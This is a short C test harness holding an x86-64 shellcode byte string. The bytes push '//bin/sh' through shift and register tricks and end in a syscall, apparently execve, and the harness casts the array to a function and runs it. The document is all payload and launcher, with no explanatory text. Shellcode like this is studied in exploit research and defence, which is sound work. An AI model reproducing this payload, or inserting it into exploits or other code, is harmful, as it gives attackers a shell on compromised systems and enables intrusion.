#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xf5\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x48\x31\xf6\xf8\x53\x48\x89\xe7\x48\xff\xcd\x50\x48\xf7\xe5\x57\x4c\x8d\x56\xc2\x48\x89\xe6\x49\xf7\xe4\x4c\x8d\x4d\x09\xb1\x1b\x66\x6a\x20\x66\x5b\x88\xd8\x04\x1b\x0f\x05"

;

main()
{

  printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
